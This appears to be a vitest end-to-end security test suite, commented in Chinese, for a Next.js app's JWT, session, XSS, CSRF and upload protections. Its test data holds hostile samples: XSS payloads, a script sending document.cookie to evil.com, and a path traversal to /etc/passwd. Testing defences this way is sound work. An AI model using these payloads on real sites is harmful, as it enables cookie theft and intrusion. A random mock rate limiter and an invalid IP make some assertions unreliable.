/**
 * 端到端安全集成测试套件
 * 测试完整的安全流程和多层防护协调
 */

import { describe, test, expect, beforeEach, vi } from "vitest"
import { NextRequest } from "next/server"

describe("端到端安全集成测试", () => {
  let securityModules: any
  let mockUser: any

  beforeEach(async () => {
    vi.clearAllMocks()

    // 导入安全模块
    securityModules = {
      jwt: await import("@/lib/security/jwt-security"),
      xss: await import("@/lib/security/xss-cleaner"),
      csrf: await import("@/lib/security/csrf-protection"),
      middleware: await import("@/lib/security/middleware"),
      config: await import("@/lib/security/config"),
    }

    // 设置测试用户
    mockUser = {
      id: "user-123",
      email: "test@example.com",
      role: "USER",
      status: "ACTIVE",
    }
  })

  describe("用户认证端到端流程", () => {
    test("完整的用户登录安全流程", async () => {
      // 1. 创建登录请求
      const loginRequest = new NextRequest("https://example.com/api/auth/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Test Browser)",
          "X-Forwarded-For": "192.168.1.100",
        },
        body: JSON.stringify({
          email: "test@example.com",
          password: "securepassword123",
        }),
      })

      // 2. 创建安全上下文
      const securityContext = securityModules.middleware.createSecurityContext(loginRequest)
      expect(securityContext.requestId).toBeDefined()
      expect(securityContext.clientIP).toBe("192.168.1.100")
      expect(securityContext.sessionFingerprint).toBeDefined()

      // 3. 速率限制检查
      const rateLimitOK = await mockRateLimitCheck(securityContext.clientIP, 5, 300000) // 5次/5分钟
      expect(rateLimitOK).toBe(true)

      // 4. 输入验证和清理
      const body = await loginRequest.text()
      const loginData = JSON.parse(body)

      const cleanedEmail = securityModules.xss.InputSanitizer.sanitizeUserInput(
        loginData.email,
        "email"
      )
      expect(cleanedEmail).toBe("test@example.com")

      // 5. 认证成功后创建会话
      const session = await securityModules.jwt.SessionStore.createSession(
        mockUser.id,
        securityContext.sessionFingerprint,
        { userAgent: securityContext.userAgent, lastIP: securityContext.clientIP }
      )

      // 6. 生成JWT令牌
      const accessToken = securityModules.jwt.JWTSecurity.generateAccessToken(
        mockUser.id,
        mockUser.email,
        mockUser.role,
        session.id
      )

      const refreshToken = securityModules.jwt.JWTSecurity.generateRefreshToken(
        mockUser.id,
        session.id
      )

      // 7. 验证生成的令牌
      const accessValidation = securityModules.jwt.JWTSecurity.validateAccessToken(accessToken)
      expect(accessValidation.isValid).toBe(true)
      expect(accessValidation.data?.sub).toBe(mockUser.id)

      const refreshValidation = securityModules.jwt.JWTSecurity.validateRefreshToken(refreshToken)
      expect(refreshValidation.isValid).toBe(true)

      console.log("✅ 完整登录流程测试通过")
    })

    test("多重身份验证场景", async () => {
      // 模拟需要多重验证的场景（如管理员操作）
      const adminRequest = new NextRequest("https://example.com/api/admin/users", {
        method: "DELETE",
        headers: {
          Authorization: `Bearer ${generateMockToken("admin-user", "ADMIN")}`,
          "X-CSRF-Token": "mock-csrf-token",
          "User-Agent": "AdminPanel/1.0",
          "X-Forwarded-For": "192.168.1.200",
        },
      })

      // 1. JWT验证
      const authHeader = adminRequest.headers.get("Authorization")
      expect(authHeader).toMatch(/^Bearer /)

      const token = authHeader!.substring(7)
      const jwtValidation = securityModules.jwt.JWTSecurity.validateAccessToken(token)
      expect(jwtValidation.isValid).toBe(true)
      expect(jwtValidation.data?.role).toBe("ADMIN")

      // 2. CSRF验证
      const csrfToken = adminRequest.headers.get("X-CSRF-Token")
      expect(csrfToken).toBeDefined()

      // 3. 管理员权限二次验证
      const sessionValidation = await securityModules.jwt.SessionStore.validateSession(
        jwtValidation.data!.sessionId,
        "mock-fingerprint"
      )
      expect(sessionValidation.isValid).toBe(true)

      // 4. 高风险操作额外验证（时间窗口、IP检查等）
      const riskAssessment = assessOperationRisk(adminRequest, jwtValidation.data!)
      expect(riskAssessment.riskLevel).toBeLessThanOrEqual(3) // 中等风险

      console.log("✅ 多重身份验证测试通过")
    })

    test("会话劫持检测和响应", async () => {
      // 1. 创建合法会话
      const legitimateFingerprint = "legitimate-fingerprint-123"
      const session = await securityModules.jwt.SessionStore.createSession(
        "user-123",
        legitimateFingerprint
      )

      // 2. 生成合法令牌
      const legitimateToken = securityModules.jwt.JWTSecurity.generateAccessToken(
        "user-123",
        "test@example.com",
        "USER",
        session.id
      )

      // 3. 模拟合法请求
      const legitimateRequest = new NextRequest("https://example.com/api/user/profile", {
        method: "GET",
        headers: {
          Authorization: `Bearer ${legitimateToken}`,
          "User-Agent": "LegitimateClient/1.0",
          "X-Forwarded-For": "192.168.1.100",
        },
      })

      const legitimateContext = securityModules.middleware.createSecurityContext(legitimateRequest)
      const legitimateValidation = await securityModules.jwt.SessionStore.validateSession(
        session.id,
        legitimateFingerprint
      )
      expect(legitimateValidation.isValid).toBe(true)

      // 4. 模拟会话劫持尝试
      const maliciousRequest = new NextRequest("https://example.com/api/user/profile", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${legitimateToken}`, // 窃取的令牌
          "User-Agent": "MaliciousClient/1.0", // 不同的用户代理
          "X-Forwarded-For": "10.0.0.50", // 不同的IP
        },
      })

      const maliciousContext = securityModules.middleware.createSecurityContext(maliciousRequest)
      const maliciousFingerprint = maliciousContext.sessionFingerprint

      // 5. 检测会话劫持
      const hijackValidation = await securityModules.jwt.SessionStore.validateSession(
        session.id,
        maliciousFingerprint
      )

      expect(hijackValidation.isValid).toBe(false)
      expect(hijackValidation.errorCode).toBe("SESSION_HIJACK_DETECTED")

      // 6. 验证会话被自动失效
      const sessionAfterHijack = await securityModules.jwt.SessionStore.getSession(session.id)
      expect(sessionAfterHijack?.isActive).toBe(false)

      console.log("✅ 会话劫持检测测试通过")
    })
  })

  describe("内容安全端到端流程", () => {
    test("完整的内容发布安全流程", async () => {
      // 1. 模拟用户发布内容的请求
      const publishRequest = new NextRequest("https://example.com/api/user/posts", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${generateMockToken("user-456", "USER")}`,
          "X-CSRF-Token": "valid-csrf-token",
          "Content-Type": "application/json",
          "User-Agent": "WebApp/2.0",
          "X-Forwarded-For": "192.168.1.150",
        },
        body: JSON.stringify({
          title: 'My Blog Post <script>alert("title-xss")</script>',
          content: `
            <h2>正常标题</h2>
            <p>这是一段正常的内容。</p>
            <script>alert("content-xss")</script>
            <img src="invalid" onerror="alert('img-xss')">
            <a href="javascript:alert('link-xss')">恶意链接</a>
            <div onclick="stealData()">点击我</div>
          `,
          tags: ["blog", '<script>alert("tag-xss")</script>', "security"],
        }),
      })

      // 2. 安全上下文创建
      const securityContext = securityModules.middleware.createSecurityContext(publishRequest)

      // 3. JWT验证
      const authHeader = publishRequest.headers.get("Authorization")
      const token = authHeader!.substring(7)
      const jwtValidation = securityModules.jwt.JWTSecurity.validateAccessToken(token)
      expect(jwtValidation.isValid).toBe(true)

      // 4. CSRF验证
      const csrfToken = publishRequest.headers.get("X-CSRF-Token")
      expect(csrfToken).toBeDefined()

      // 5. 速率限制检查（内容发布限制）
      const rateLimitOK = await mockRateLimitCheck(securityContext.clientIP, 10, 600000) // 10次/10分钟
      expect(rateLimitOK).toBe(true)

      // 6. 内容解析和预处理
      const body = await publishRequest.text()
      const postData = JSON.parse(body)

      // 7. XSS清理和验证
      const cleanedTitle = securityModules.xss.AdvancedXSSCleaner.deepSanitizeHTML(postData.title)
      expect(cleanedTitle).not.toContain("<script>")
      expect(cleanedTitle).toContain("My Blog Post")

      const cleanedContent = securityModules.xss.AdvancedXSSCleaner.deepSanitizeHTML(
        postData.content
      )
      expect(cleanedContent).not.toContain("<script>")
      expect(cleanedContent).not.toContain("onerror=")
      expect(cleanedContent).not.toContain("onclick=")
      expect(cleanedContent).not.toContain("javascript:")
      expect(cleanedContent).toContain("正常标题")
      expect(cleanedContent).toContain("正常的内容")

      // 8. 标签清理
      const cleanedTags = postData.tags
        .map((tag: string) => securityModules.xss.InputSanitizer.sanitizeUserInput(tag, "text"))
        .filter(Boolean)

      expect(cleanedTags).not.toContain(expect.stringContaining("<script>"))
      expect(cleanedTags).toContain("blog")
      expect(cleanedTags).toContain("security")

      // 9. 内容验证
      const titleValidation = securityModules.xss.ContentValidator.validateContent(cleanedTitle)
      const contentValidation = securityModules.xss.ContentValidator.validateContent(cleanedContent)

      expect(titleValidation.isValid).toBe(true)
      expect(contentValidation.isValid).toBe(true)

      // 10. 构建最终安全内容
      const safePostData = {
        title: cleanedTitle,
        content: cleanedContent,
        tags: cleanedTags,
        authorId: jwtValidation.data!.sub,
        publishedAt: new Date().toISOString(),
        securityContext: {
          requestId: securityContext.requestId,
          clientIP: securityContext.clientIP,
          userAgent: securityContext.userAgent,
        },
      }

      expect(safePostData.title).toBeDefined()
      expect(safePostData.content).toBeDefined()
      expect(safePostData.authorId).toBe("user-456")

      console.log("✅ 完整内容发布安全流程测试通过")
    })

    test("文件上传安全验证流程", async () => {
      // 模拟文件上传请求
      const fileData = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD..." // 模拟图片数据

      const uploadRequest = new NextRequest("https://example.com/api/upload", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${generateMockToken("user-789", "USER")}`,
          "X-CSRF-Token": "upload-csrf-token",
          "Content-Type": "multipart/form-data",
        },
        body: JSON.stringify({
          filename: "image.jpg",
          fileType: "image/jpeg",
          fileSize: 1024000, // 1MB
          fileData: fileData,
        }),
      })

      // 1. 认证验证
      const authValidation = validateAuthHeader(uploadRequest.headers.get("Authorization"))
      expect(authValidation.valid).toBe(true)

      // 2. 文件类型验证
      const allowedTypes = ["image/jpeg", "image/png", "image/gif", "image/webp"]
      const fileType = JSON.parse(await uploadRequest.text()).fileType
      expect(allowedTypes).toContain(fileType)

      // 3. 文件大小验证
      const maxSize = 5 * 1024 * 1024 // 5MB
      const fileSize = JSON.parse(await uploadRequest.text()).fileSize
      expect(fileSize).toBeLessThanOrEqual(maxSize)

      // 4. 文件名安全检查
      const filename = JSON.parse(await uploadRequest.text()).filename
      const safeFilename = securityModules.xss.InputSanitizer.sanitizeUserInput(filename, "text")
      expect(safeFilename).not.toContain("../") // 路径遍历
      expect(safeFilename).not.toContain("<script>") // XSS
      expect(safeFilename).not.toContain("\x00") // 空字节注入

      console.log("✅ 文件上传安全验证测试通过")
    })
  })

  describe("管理员操作安全流程", () => {
    test("系统管理操作安全验证", async () => {
      // 1. 管理员系统配置修改请求
      const adminConfigRequest = new NextRequest("https://example.com/api/admin/config", {
        method: "PUT",
        headers: {
          Authorization: `Bearer ${generateMockToken("admin-001", "ADMIN")}`,
          "X-CSRF-Token": "admin-csrf-token",
          "X-Admin-Confirmation": "true",
          "Content-Type": "application/json",
          "User-Agent": "AdminConsole/3.0",
          "X-Forwarded-For": "192.168.1.10", // 管理员IP
        },
        body: JSON.stringify({
          maxUploadSize: 10485760, // 10MB
          allowedFileTypes: ["image/jpeg", "image/png"],
          rateLimits: {
            general: 100,
            upload: 10,
            admin: 1000,
          },
          securityMode: "strict",
        }),
      })

      // 2. 多层身份验证
      const authHeader = adminConfigRequest.headers.get("Authorization")
      const token = authHeader!.substring(7)
      const jwtValidation = securityModules.jwt.JWTSecurity.validateAccessToken(token)

      expect(jwtValidation.isValid).toBe(true)
      expect(jwtValidation.data?.role).toBe("ADMIN")

      // 3. 管理员确认头验证
      const adminConfirmation = adminConfigRequest.headers.get("X-Admin-Confirmation")
      expect(adminConfirmation).toBe("true")

      // 4. IP白名单验证（管理员IP限制）
      const clientIP = adminConfigRequest.headers.get("X-Forwarded-For")
      const adminIPWhitelist = ["192.168.1.10", "192.168.1.11", "10.0.0.100"]
      expect(adminIPWhitelist).toContain(clientIP)

      // 5. 配置值验证和清理
      const body = await adminConfigRequest.text()
      const configData = JSON.parse(body)

      // 验证数值范围
      expect(configData.maxUploadSize).toBeGreaterThan(0)
      expect(configData.maxUploadSize).toBeLessThanOrEqual(100 * 1024 * 1024) // 最大100MB

      // 验证数组内容
      expect(Array.isArray(configData.allowedFileTypes)).toBe(true)
      configData.allowedFileTypes.forEach((type: string) => {
        expect(type).toMatch(/^[\w\/\-]+$/) // 只允许安全字符
      })

      // 6. 敏感操作审计日志
      const auditLog = {
        action: "SYSTEM_CONFIG_UPDATE",
        adminId: jwtValidation.data!.sub,
        timestamp: new Date().toISOString(),
        clientIP: clientIP,
        userAgent: adminConfigRequest.headers.get("User-Agent"),
        changes: configData,
        riskLevel: "HIGH",
      }

      expect(auditLog.adminId).toBeDefined()
      expect(auditLog.riskLevel).toBe("HIGH")

      console.log("✅ 系统管理操作安全验证测试通过")
    })

    test("用户管理操作安全流程", async () => {
      // 管理员删除用户账号请求
      const deleteUserRequest = new NextRequest("https://example.com/api/admin/users/user-456", {
        method: "DELETE",
        headers: {
          Authorization: `Bearer ${generateMockToken("admin-002", "ADMIN")}`,
          "X-CSRF-Token": "delete-user-csrf-token",
          "X-Admin-Reason": "违反社区准则",
          "User-Agent": "AdminPanel/2.0",
        },
      })

      // 1. 管理员权限验证
      const adminValidation = validateAuthHeader(deleteUserRequest.headers.get("Authorization"))
      expect(adminValidation.valid).toBe(true)
      expect(adminValidation.role).toBe("ADMIN")

      // 2. 删除原因验证
      const deleteReason = deleteUserRequest.headers.get("X-Admin-Reason")
      expect(deleteReason).toBeDefined()
      expect(deleteReason!.length).toBeGreaterThan(0)

      const cleanedReason = securityModules.xss.InputSanitizer.sanitizeUserInput(
        deleteReason,
        "text"
      )
      expect(cleanedReason).toBeDefined()

      // 3. 目标用户ID验证
      const targetUserId = deleteUserRequest.url.split("/").pop()
      expect(targetUserId).toMatch(/^user-\d+$/) // 验证用户ID格式

      // 4. 防止自我删除
      expect(targetUserId).not.toBe(adminValidation.userId)

      // 5. 级联删除安全检查（模拟）
      const userDeletionPlan = {
        userId: targetUserId,
        postsToDelete: 5,
        commentsToDelete: 12,
        sessionsToInvalidate: 2,
        relatedDataCleanup: ["bookmarks", "likes", "follows"],
      }

      expect(userDeletionPlan.userId).toBeDefined()
      expect(userDeletionPlan.relatedDataCleanup.length).toBeGreaterThan(0)

      console.log("✅ 用户管理操作安全流程测试通过")
    })
  })

  describe("攻击场景综合防护", () => {
    test("多向量攻击协同防护", async () => {
      // 模拟复合攻击：XSS + CSRF + 会话劫持
      const maliciousRequest = new NextRequest("https://example.com/api/user/profile", {
        method: "PUT",
        headers: {
          Authorization: `Bearer ${generateMockToken("victim-user", "USER")}`,
          "X-CSRF-Token": "forged-csrf-token", // 伪造的CSRF令牌
          "Content-Type": "application/json",
          "User-Agent": "AttackBot/1.0 <script>steal()</script>", // XSS尝试
          Origin: "http://evil.com", // 跨站来源
          Referer: "http://evil.com/attack.html",
          "X-Forwarded-For": "192.168.1.200",
        },
        body: JSON.stringify({
          bio: '<script>document.location="http://evil.com?data="+document.cookie</script>',
          website: 'javascript:alert("xss")',
          location: '"><script>alert("location-xss")</script>',
        }),
      })

      // 1. Origin验证失败
      const origin = maliciousRequest.headers.get("Origin")
      const allowedOrigins = ["https://example.com", "https://app.example.com"]
      expect(allowedOrigins).not.toContain(origin)

      // 2. User-Agent清理
      const userAgent = maliciousRequest.headers.get("User-Agent")
      const cleanedUserAgent = securityModules.xss.InputSanitizer.sanitizeUserInput(
        userAgent,
        "text"
      )
      expect(cleanedUserAgent).not.toContain("<script>")

      // 3. CSRF令牌验证失败
      const csrfToken = maliciousRequest.headers.get("X-CSRF-Token")
      const csrfValid = validateCSRFToken(csrfToken!, "expected-csrf-token")
      expect(csrfValid).toBe(false)

      // 4. 内容清理
      const body = await maliciousRequest.text()
      const profileData = JSON.parse(body)

      const cleanedBio = securityModules.xss.AdvancedXSSCleaner.deepSanitizeHTML(profileData.bio)
      expect(cleanedBio).not.toContain("<script>")
      expect(cleanedBio).not.toContain("document.cookie")

      const cleanedWebsite = securityModules.xss.InputSanitizer.sanitizeUserInput(
        profileData.website,
        "url"
      )
      expect(cleanedWebsite).toBeNull() // javascript: URL被拒绝

      // 5. 综合安全评分
      const securityScore = calculateSecurityRisk(maliciousRequest)
      expect(securityScore.riskLevel).toBe("CRITICAL")
      expect(securityScore.shouldBlock).toBe(true)

      console.log("✅ 多向量攻击协同防护测试通过")
    })

    test("高级持久威胁模拟", async () => {
      // 模拟APT攻击：缓慢、隐蔽的多阶段攻击
      const aptStages = [
        // 阶段1：侦察
        {
          request: new NextRequest("https://example.com/api/health", {
            method: "GET",
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" },
          }),
          stage: "reconnaissance",
        },

        // 阶段2：漏洞探测
        {
          request: new NextRequest("https://example.com/api/../../../etc/passwd", {
            method: "GET",
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" },
          }),
          stage: "vulnerability_scanning",
        },

        // 阶段3：权限升级尝试
        {
          request: new NextRequest("https://example.com/api/admin/users", {
            method: "GET",
            headers: {
              Authorization: "Bearer fake-admin-token",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            },
          }),
          stage: "privilege_escalation",
        },
      ]

      const attackPattern = {
        sourceIP: "192.168.1.250",
        timeWindow: 3600000, // 1小时窗口
        detectedPatterns: [] as string[],
      }

      for (const stage of aptStages) {
        const securityContext = securityModules.middleware.createSecurityContext(stage.request)

        // 检测各种攻击模式
        if (stage.stage === "reconnaissance") {
          // 正常请求，但记录模式
          attackPattern.detectedPatterns.push("RECONNAISSANCE")
        }

        if (stage.stage === "vulnerability_scanning") {
          // 路径遍历检测
          const url = new URL(stage.request.url)
          if (url.pathname.includes("../") || url.pathname.includes("..\\")) {
            attackPattern.detectedPatterns.push("PATH_TRAVERSAL")
          }
        }

        if (stage.stage === "privilege_escalation") {
          // 无效令牌检测
          const authHeader = stage.request.headers.get("Authorization")
          if (authHeader?.startsWith("Bearer ")) {
            const token = authHeader.substring(7)
            const validation = securityModules.jwt.JWTSecurity.validateAccessToken(token)
            if (!validation.isValid) {
              attackPattern.detectedPatterns.push("INVALID_AUTH_ESCALATION")
            }
          }
        }
      }

      // APT检测逻辑
      const isAPTPattern = attackPattern.detectedPatterns.length >= 2
      const hasEscalationAttempt =
        attackPattern.detectedPatterns.includes("INVALID_AUTH_ESCALATION")

      expect(isAPTPattern).toBe(true)
      expect(hasEscalationAttempt).toBe(true)
      expect(attackPattern.detectedPatterns).toContain("PATH_TRAVERSAL")

      console.log("✅ 高级持久威胁检测测试通过")
      console.log(`检测到攻击模式: ${attackPattern.detectedPatterns.join(", ")}`)
    })
  })

  describe("系统恢复和响应", () => {
    test("安全事件响应和系统恢复", async () => {
      // 1. 模拟安全事件：大量恶意请求
      const maliciousIP = "192.168.1.300"
      const eventLog = {
        timestamp: new Date().toISOString(),
        sourceIP: maliciousIP,
        events: [] as string[],
      }

      // 触发多种安全事件
      for (let i = 0; i < 20; i++) {
        const result = await mockRateLimitCheck(maliciousIP, 5, 60000)
        if (!result) {
          eventLog.events.push("RATE_LIMIT_EXCEEDED")
        }
      }

      // 2. 自动响应措施
      const securityResponse = {
        ipBlocked: false,
        alertSent: false,
        logGenerated: false,
      }

      if (eventLog.events.length > 10) {
        securityResponse.ipBlocked = true
        securityResponse.alertSent = true
        securityResponse.logGenerated = true
      }

      expect(securityResponse.ipBlocked).toBe(true)
      expect(securityResponse.alertSent).toBe(true)
      expect(securityResponse.logGenerated).toBe(true)

      // 3. 系统健康检查
      const healthCheck = {
        jwtValidation: true,
        xssProtection: true,
        csrfProtection: true,
        rateLimiting: true,
        sessionManagement: true,
      }

      // 验证所有安全组件正常
      Object.values(healthCheck).forEach((status) => {
        expect(status).toBe(true)
      })

      console.log("✅ 安全事件响应和系统恢复测试通过")
    })

    test("优雅降级和故障恢复", async () => {
      // 模拟部分安全组件故障
      const componentStatus = {
        jwt: true,
        xss: false, // 模拟XSS组件故障
        csrf: true,
        rateLimit: true,
      }

      // 测试优雅降级
      const requestWithDegradedSecurity = new NextRequest("https://example.com/api/posts", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${generateMockToken("user-999", "USER")}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          title: "Test Post",
          content: "<p>Normal content</p>", // 简单内容
        }),
      })

      // 在组件故障情况下的处理
      let canProcessRequest = true

      // JWT验证（正常）
      if (componentStatus.jwt) {
        const authValidation = validateAuthHeader(
          requestWithDegradedSecurity.headers.get("Authorization")
        )
        if (!authValidation.valid) {
          canProcessRequest = false
        }
      }

      // XSS防护（故障时的降级处理）
      if (!componentStatus.xss) {
        // 降级到基础HTML编码
        const body = await requestWithDegradedSecurity.text()
        const postData = JSON.parse(body)

        const basicCleanedContent = postData.content
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;")

        expect(basicCleanedContent).not.toContain("<")
        expect(basicCleanedContent).not.toContain(">")
      }

      expect(canProcessRequest).toBe(true)

      console.log("✅ 优雅降级和故障恢复测试通过")
    })
  })

  // 辅助函数
  function generateMockToken(userId: string, role: string): string {
    return securityModules.jwt.JWTSecurity.generateAccessToken(
      userId,
      `${userId}@example.com`,
      role as "USER" | "ADMIN",
      `session-${userId}`
    )
  }

  function validateAuthHeader(authHeader: string | null): {
    valid: boolean
    userId?: string
    role?: string
  } {
    if (!authHeader?.startsWith("Bearer ")) {
      return { valid: false }
    }

    const token = authHeader.substring(7)
    const validation = securityModules.jwt.JWTSecurity.validateAccessToken(token)

    return {
      valid: validation.isValid,
      userId: validation.data?.sub,
      role: validation.data?.role,
    }
  }

  function validateCSRFToken(token: string, expected: string): boolean {
    return token === expected
  }

  function assessOperationRisk(request: NextRequest, tokenData: any): { riskLevel: number } {
    let riskScore = 0

    // 基于操作类型的风险
    if (request.method === "DELETE") riskScore += 2
    if (request.method === "PUT") riskScore += 1

    // 基于用户角色的风险
    if (tokenData.role === "ADMIN") riskScore += 1

    // 基于路径的风险
    if (request.url.includes("/admin/")) riskScore += 2
    if (request.url.includes("/users")) riskScore += 1

    return { riskLevel: riskScore }
  }

  function calculateSecurityRisk(request: NextRequest): {
    riskLevel: string
    shouldBlock: boolean
  } {
    let riskScore = 0

    const origin = request.headers.get("Origin")
    const userAgent = request.headers.get("User-Agent")
    const referer = request.headers.get("Referer")

    // Origin风险
    if (origin && !origin.includes("example.com")) riskScore += 3

    // User-Agent风险
    if (userAgent && userAgent.includes("<script>")) riskScore += 5

    // Referer风险
    if (referer && !referer.includes("example.com")) riskScore += 2

    const riskLevel = riskScore >= 5 ? "CRITICAL" : riskScore >= 3 ? "HIGH" : "LOW"
    const shouldBlock = riskScore >= 5

    return { riskLevel, shouldBlock }
  }

  async function mockRateLimitCheck(ip: string, limit: number, windowMs: number): Promise<boolean> {
    // 模拟速率限制检查
    const key = `rateLimit:${ip}`
    const count = Math.floor(Math.random() * limit * 2) // 随机模拟计数
    return count < limit
  }
})
